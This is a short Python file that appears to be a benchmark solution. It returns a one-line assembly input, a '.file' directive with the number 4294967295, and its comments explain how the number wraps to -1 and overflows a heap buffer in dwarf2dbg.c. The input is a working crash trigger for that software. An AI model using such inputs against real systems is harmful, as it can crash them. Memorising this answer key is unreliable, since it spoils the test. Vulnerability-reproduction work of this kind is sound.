import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a heap buffer overflow in dwarf2dbg.c, within the
        # assign_file_to_slot function. It is triggered by providing a large
        # integer value in a `.file` directive that overflows a signed 32-bit integer.
        #
        # For example, the number 4294967295 (2^32 - 1) is the maximum value for
        # an unsigned 32-bit integer. When this is parsed and stored in a signed
        # 32-bit integer variable, it overflows and wraps around to -1.
        #
        # The vulnerable code then uses this negative value as an index for a
        # heap-allocated array, resulting in an out-of-bounds write (specifically,
        # a write before the start of the allocated buffer), which crashes the program.
        #
        # The PoC consists of a single line of assembly code containing such a directive.
        # To achieve a smaller PoC size for a better score, we use a minimal filename, like "a".
        return b'.file 4294967295 "a"\n'